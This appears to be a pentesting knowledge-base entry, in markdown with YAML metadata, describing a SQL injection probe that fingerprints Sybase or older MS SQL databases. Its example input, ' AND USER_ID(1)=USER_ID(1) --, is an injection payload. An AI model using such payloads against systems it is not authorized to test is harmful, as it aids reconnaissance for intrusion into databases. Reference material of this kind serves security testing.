---
type: command
executor: sql
data: USER_ID(1)=USER_ID(1)
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Database
tags:
  - sql-injection
  - fingerprinting
verified: true
validated: true
---

# sybase-user-id-test

## Command

```sql
USER_ID(1)=USER_ID(1)
```

## Description

Tests for Sybase or compatible (e.g., older MS SQL) using USER_ID function.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| None | Fixed | N/A |

## Examples

### Basic Usage

`' AND USER_ID(1)=USER_ID(1) --`

## Expected Output

True if Sybase/MS SQL compatible.

## Related

- [[procedures/DBMS-Fingerprinting-via-SQL-Injection]]
- [[commands/mssql-binary-checksum-test]]
